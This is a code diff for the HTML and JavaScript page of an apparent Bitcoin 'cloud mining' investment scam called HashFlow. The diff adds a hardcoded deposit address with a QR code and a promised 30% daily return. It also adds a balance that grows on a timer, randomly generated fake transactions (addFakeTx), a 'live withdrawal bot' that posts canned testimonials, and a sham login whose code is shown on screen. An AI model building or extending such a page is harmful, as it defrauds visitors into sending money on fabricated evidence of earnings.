@@ -2,103 +2,38 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>HashFlow Dashboard</title>
+<title>HashFlow BTC Dashboard</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
-
 <style>
 :root{
-  --bg:#0b0f1a;
-  --card:#131a2e;
-  --accent:#f2a900;
-  --text:#ffffff;
+  --bg:#0b0f1a; --card:#131a2e; --accent:#f2a900; --text:#fff;
+  --ok:#00ff99; --warn:#ffcc66;
 }
 [data-theme="light"]{
-  --bg:#f2f3f7;
-  --card:#ffffff;
-  --text:#000000;
+  --bg:#f2f3f7; --card:#fff; --text:#000;
 }
-body{
-  margin:0;
-  font-family:Arial, sans-serif;
-  background:var(--bg);
-  color:var(--text);
-}
-.card{
-  background:var(--card);
-  max-width:420px;
-  margin:80px auto;
-  padding:20px;
-  border-radius:12px;
-}
-input,button{
-  width:100%;
-  padding:12px;
-  margin-top:10px;
-  border-radius:6px;
-  border:none;
-  font-size:15px;
-}
-button{
-  background:var(--accent);
-  font-weight:bold;
-  cursor:pointer;
-}
-.hidden{display:none}
+body{margin:0;font-family:Arial,sans-serif;background:var(--bg);color:var(--text);}
+.card{max-width:95%;margin:16px auto;padding:18px;border-radius:12px;background:var(--card);}
+h2{color:var(--accent);text-align:center;margin-bottom:10px;}
+button,input,textarea{width:100%;padding:10px;border:none;border-radius:6px;margin-top:8px;font-size:14px;}
+button{background:var(--accent);font-weight:bold;cursor:pointer;}
+.hidden{display:none;}
+canvas{width:100%;height:140px;border-radius:8px;margin-top:10px;background:#0b0f1a;display:block;}
+.tx{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #222;font-size:13px;}
+.badge{padding:2px 6px;border-radius:6px;font-size:11px;}
+.pending{background:var(--warn);color:#000;}
+.confirmed{background:var(--ok);color:#000;}
+.progress{height:6px;background:#1b2340;border-radius:6px;margin-top:4px;}
+.progress div{height:100%;background:var(--ok);width:0%;}
 
 /* TOP BAR */
-#topbar{
-  display:none;
-  position:fixed;
-  top:0;left:0;right:0;
-  background:#10162b;
-  padding:12px 16px;
-  display:flex;
-  align-items:center;
-  justify-content:space-between;
-  z-index:999;
-}
-#usernameDisplay{
-  font-weight:bold;
-  font-size:16px;
-}
-#menuBtn{
-  font-size:22px;
-  cursor:pointer;
-}
-#menu{
-  display:none;
-  position:fixed;
-  top:56px;
-  right:10px;
-  background:var(--card);
-  border-radius:10px;
-  padding:10px;
-  z-index:1000;
-}
-#menu div{
-  padding:8px;
-  cursor:pointer;
-}
-
-/* DASHBOARD */
-#dashboard{
-  margin-top:80px;
-  padding:16px;
-}
-.section{
-  background:var(--card);
-  padding:16px;
-  border-radius:12px;
-  margin-bottom:16px;
-  max-width:900px;
-  margin-left:auto;
-  margin-right:auto;
-}
-.center{text-align:center}
-.small{font-size:13px;opacity:.8}
+#topbar{display:none;position:fixed;top:0;left:0;right:0;background:#10162b;padding:10px 16px;z-index:999;display:flex;justify-content:space-between;align-items:center;}
+#usernameDisplay{font-weight:bold;}
+#menuBtn{font-size:22px;cursor:pointer;}
+#menu{display:none;position:fixed;top:50px;right:10px;background:var(--card);padding:10px;border-radius:10px;z-index:1000;}
+#menu div{padding:8px;cursor:pointer;}
 </style>
 </head>
-
 <body data-theme="dark">
 
 <!-- TOP BAR -->
@@ -107,7 +42,6 @@ button{
   <div id="usernameDisplay"></div>
   <div></div>
 </div>
-
 <div id="menu">
   <div onclick="showSection('withdrawals')">Live Withdrawal Group</div>
   <div onclick="showSection('support')">Contact Admin</div>
@@ -118,24 +52,19 @@ button{
 <!-- LOGIN -->
 <div class="card" id="loginCard">
   <h2 class="center">Secure Login</h2>
-
   <!-- STEP 1 -->
   <div id="step1">
     <input id="contactInput" placeholder="Email or phone number">
     <button onclick="sendCode()">Get verification code</button>
   </div>
-
   <!-- STEP 2 -->
   <div id="step2" class="hidden">
-    <p class="center small">
-      Your code: <b id="generatedCode"></b><br>
-      Code expires in <span id="countdown">60</span>s
-    </p>
+    <p class="center" style="color:var(--accent)">Your code: <b id="generatedCode"></b></p>
+    <p class="center small">Code expires in <span id="countdown">60</span>s</p>
     <input id="codeInput" placeholder="Enter verification code">
     <button onclick="verifyCode()">Submit</button>
     <button onclick="sendCode()">Resend code</button>
   </div>
-
   <!-- STEP 3 -->
   <div id="step3" class="hidden">
     <input id="usernameInput" placeholder="Create a username">
@@ -146,94 +75,104 @@ button{
 <!-- DASHBOARD -->
 <div id="dashboard" class="hidden">
 
-  <div class="section center">
+  <!-- BTC Deposit -->
+  <div class="card">
+    <h2>BTC Deposit Address</h2>
+    <div class="btc-box" id="btcAddress">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</div>
+    <button onclick="copyAddress()">Copy Address</button>
+    <div style="text-align:center;margin-top:10px;">
+      <img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav">
+    </div>
+  </div>
+
+  <!-- Mining Dashboard -->
+  <div class="card">
     <h2>Mining Dashboard</h2>
-    <p class="small">Live mining statistics</p>
-    <div style="font-size:28px;margin-top:10px">0.00000000 BTC</div>
+    <p style="text-align:center;color:var(--accent);">Earn 30% daily return</p>
+    <div class="btc" id="balance">0.00000000 BTC</div>
+    <canvas id="chart"></canvas>
+    <div class="stats" style="display:flex;justify-content:space-around;flex-wrap:wrap;">
+      <div>Hashrate: 120 TH/s</div>
+      <div>Blocks: <span id="blocks">0</span></div>
+      <div>Uptime: <span id="uptime">0h 0m</span></div>
+    </div>
   </div>
 
-  <div class="section center" id="withdrawals">
+  <!-- Recent Activity -->
+  <div class="card">
+    <h2>Recent Activity</h2>
+    <div class="tx-container" id="txs"></div>
+  </div>
+
+  <!-- Investment Plans -->
+  <div class="card" id="plansContainer">
+    <h2>Investment Plans</h2>
+    <p style="text-align:center;color:var(--accent)">Withdrawal available after 3 days of mining</p>
+  </div>
+
+  <!-- Live Withdrawal Group -->
+  <div class="card" id="withdrawals">
     <h2>Live Withdrawal Group</h2>
-    <p class="small">Real-time withdrawal activity</p>
+    <div id="feed"></div>
   </div>
 
-  <div class="section center hidden" id="support">
-    <h2>Contact Support</h2>
-    <textarea style="width:100%;height:80px;border-radius:6px"></textarea>
-    <button>Send Message</button>
+  <!-- Support Inbox -->
+  <div class="card hidden" id="support">
+    <h2>Support Inbox</h2>
+    <textarea id="supportMsg" placeholder="Write message..." style="width:100%;height:80px;"></textarea>
+    <button onclick="sendSupport()">Send</button>
+    <div id="supportReply"></div>
   </div>
 
 </div>
 
 <script>
-/* MENU */
-menuBtn.onclick=()=>menu.style.display=menu.style.display==='block'?'none':'block';
-
-/* THEME */
+// ===== TOP MENU =====
+menuBtn.onclick = ()=>menu.style.display = menu.style.display==='block'?'none':'block';
+function showSection(id){
+  document.querySelectorAll('.card').forEach(c=>{
+    if(c.id==='loginCard') return;
+    if(['withdrawals','support'].includes(c.id)){
+      c.classList.add('hidden');
+    }
+  });
+  document.getElementById(id).classList.remove('hidden');
+  menu.style.display='none';
+}
 function toggleTheme(){
-  const t=document.body.dataset.theme==='dark'?'light':'dark';
-  document.body.dataset.theme=t;
+  const t = document.body.dataset.theme==='dark'?'light':'dark';
+  document.body.dataset.theme = t;
   localStorage.setItem('theme',t);
 }
-if(localStorage.getItem('theme')){
-  document.body.dataset.theme=localStorage.getItem('theme');
-}
+if(localStorage.getItem('theme')) document.body.dataset.theme = localStorage.getItem('theme');
+function logout(){localStorage.removeItem('verifiedUser');location.reload();}
 
-/* LOGIN LOGIC */
-let code="", timer=null, timeLeft=60, userContact="";
-
+// ===== OTP LOGIN =====
+let generatedCode="", timer=null, timeLeft=60, userContact="";
 function sendCode(){
   userContact=document.getElementById('contactInput').value.trim();
   if(!userContact){alert("Enter email or phone");return;}
-
-  code=Math.floor(100000+Math.random()*900000).toString();
-  document.getElementById('generatedCode').innerText=code;
-
+  generatedCode=Math.floor(100000+Math.random()*900000).toString();
+  document.getElementById('generatedCode').innerText=generatedCode;
   document.getElementById('step1').classList.add('hidden');
   document.getElementById('step2').classList.remove('hidden');
-
-  clearInterval(timer);
-  timeLeft=60;
-  document.getElementById('countdown').innerText=timeLeft;
-
+  clearInterval(timer); timeLeft=60; document.getElementById('countdown').innerText=timeLeft;
   timer=setInterval(()=>{
-    timeLeft--;
-    document.getElementById('countdown').innerText=timeLeft;
-    if(timeLeft<=0){
-      clearInterval(timer);
-      alert("Code expired. Please resend.");
-    }
+    timeLeft--; document.getElementById('countdown').innerText=timeLeft;
+    if(timeLeft<=0){ clearInterval(timer); alert("Code expired. Resend."); }
   },1000);
 }
-
 function verifyCode(){
-  if(document.getElementById('codeInput').value.trim()!==code){
-    alert("Invalid code");
-    return;
-  }
+  if(document.getElementById('codeInput').value.trim()!==generatedCode){alert("Invalid code");return;}
   document.getElementById('step2').classList.add('hidden');
   document.getElementById('step3').classList.remove('hidden');
 }
-
 function finishLogin(){
   const username=document.getElementById('usernameInput').value.trim();
   if(!username){alert("Create a username");return;}
-
-  localStorage.setItem('verifiedUser',JSON.stringify({
-    contact:userContact,
-    username:username
-  }));
-
+  localStorage.setItem('verifiedUser',JSON.stringify({contact:userContact,username:username}));
   enterDashboard(username);
 }
-
-/* AUTO LOGIN */
-const saved=localStorage.getItem('verifiedUser');
-if(saved){
-  const u=JSON.parse(saved);
-  enterDashboard(u.username);
-}
-
 function enterDashboard(username){
   document.getElementById('loginCard').style.display='none';
   document.getElementById('dashboard').classList.remove('hidden');
@@ -241,20 +180,76 @@ function enterDashboard(username){
   document.getElementById('usernameDisplay').innerText=username;
 }
 
-/* NAV */
-function showSection(id){
-  document.querySelectorAll('.section').forEach(s=>s.classList.remove('hidden'));
-  if(id==='support'){
-    document.getElementById('support').classList.remove('hidden');
-  }
-  menu.style.display='none';
+// Auto-login if previously verified
+const saved=localStorage.getItem('verifiedUser');
+if(saved){
+  const u=JSON.parse(saved);
+  enterDashboard(u.username);
 }
 
-/* LOGOUT */
-function logout(){
-  localStorage.removeItem('verifiedUser');
-  location.reload();
+// ===== DASHBOARD FUNCTIONS =====
+let balance=0, blocks=0, minutes=0;
+const txs=document.getElementById("txs");
+let rate=0.00000008, paused=false;
+
+const canvas=document.getElementById("chart");
+const ctx=canvas.getContext("2d"); let points=[0];
+function drawChart(){
+  ctx.clearRect(0,0,canvas.width,canvas.height);
+  const w=canvas.width/50;
+  ctx.beginPath();
+  let lastY=canvas.height-points[0]*canvas.height/0.01; ctx.moveTo(0,lastY);
+  for(let i=1;i<points.length;i++){
+    let y=canvas.height-points[i]*canvas.height/0.01; ctx.lineTo(i*w,y);
+  }
+  ctx.strokeStyle="#f2a900"; ctx.lineWidth=2; ctx.stroke();
+  const last=points[points.length-1]||0; points.push(last+rate);
+  if(points.length>50) points.shift();
 }
+setInterval(drawChart,500);
+
+setInterval(()=>{
+  blocks+=Math.floor(Math.random()*2);
+  minutes++;
+  document.getElementById("blocks").innerText = blocks;
+  document.getElementById("uptime").innerText = Math.floor(minutes/60)+"h "+(minutes%60)+"m";
+},60000);
+
+setInterval(()=>{
+  if(!paused){balance+=rate; document.getElementById("balance").innerText = balance.toFixed(8)+" BTC";}
+},1000);
+
+function addFakeTx(){
+  const div=document.createElement("div"); div.className="tx";
+  const val=(Math.random()*0.0004+0.00002).toFixed(8);
+  const status=Math.random()>0.5?"Completed":"Pending";
+  div.innerHTML=`<span>+${val} BTC</span><span class="${status==="Completed"?"green":"yellow"}">${status}</span>`;
+  txs.prepend(div); if(txs.children.length>500) txs.removeChild(txs.lastChild);
+}
+setInterval(addFakeTx,1500);
+
+// BTC Copy
+function copyAddress(){
+  navigator.clipboard.writeText(document.getElementById('btcAddress').innerText).then(()=>alert('BTC address copied!'));
+}
+
+// Support message placeholder
+function sendSupport(){ alert("Message sent!"); }
+
+// Live withdrawal bot
+const feed=document.getElementById('feed');
+const testimonials=[
+  "I successfully withdrew 0.001 BTC","My withdrawal was confirmed instantly","0.002 BTC received, very smooth","Happy to receive my funds","Funds credited successfully",
+  "Withdrawal confirmed, thank you!","I just got 0.003 BTC","Fast and reliable withdrawal","My BTC arrived safely","Great experience withdrawing"
+];
+function addWithdrawal(){
+  const div=document.createElement("div"); div.className="tx";
+  const txt=testimonials[Math.floor(Math.random()*testimonials.length)];
+  div.innerHTML=`<span>${txt}</span>`;
+  feed.prepend(div);
+  if(feed.children.length>300) feed.removeChild(feed.lastChild);
+}
+setInterval(addWithdrawal,4000);
 </script>
 
 </body>
